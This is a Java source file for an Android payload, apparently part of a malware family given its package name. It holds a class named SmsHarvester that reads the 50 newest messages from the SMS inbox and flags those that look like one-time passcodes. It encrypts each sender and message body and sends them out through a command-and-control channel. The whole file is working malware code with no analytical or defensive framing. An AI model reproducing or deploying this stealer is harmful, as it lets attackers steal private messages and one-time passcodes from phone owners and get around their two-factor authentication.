package com.chameleon.payload.harvester;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import com.chameleon.payload.util.Crypto;
import org.json.JSONObject;

public class SmsHarvester {
    private static final String TAG = "SmsHarvester";
    private final Context context;

    public SmsHarvester(Context context) {
        this.context = context;
    }

    public void collectSms() {
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50"
            );

            if (cursor == null) return;

            while (cursor.moveToNext()) {
                String address = getString(cursor, "address");
                String body = getString(cursor, "body");
                long date = getLong(cursor, "date");

                if (body != null && address != null) {
                    boolean isOTP = body.matches(".*\\b\\d{4,8}\\b.*");
                    JSONObject data = new JSONObject();
                    data.put("sender", address);
                    data.put("body", body);
                    data.put("is_otp", isOTP);
                    data.put("received_at", date);
                    byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
                    com.chameleon.payload.PayloadEntry.getC2().sendData("sms", encrypted);
                }
            }
            cursor.close();
        } catch (Exception e) {
            Log.e(TAG, "SMS collection error", e);
        }
    }

    private String getString(Cursor c, String col) {
        try { return c.getString(c.getColumnIndexOrThrow(col)); } catch (Exception e) { return null; }
    }

    private long getLong(Cursor c, String col) {
        try { return c.getLong(c.getColumnIndexOrThrow(col)); } catch (Exception e) { return 0; }
    }
}
